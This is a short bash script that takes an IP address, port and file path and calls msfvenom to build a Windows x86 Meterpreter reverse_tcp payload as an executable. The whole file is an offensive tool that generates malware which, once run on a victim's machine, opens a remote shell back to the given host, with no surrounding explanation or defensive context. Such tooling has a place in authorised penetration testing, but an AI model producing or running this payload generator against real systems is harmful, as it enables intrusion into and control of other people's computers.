#!/bin/bash

IP=$1
Port=$2
Path=$3

/usr/bin/msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f exe > $Path
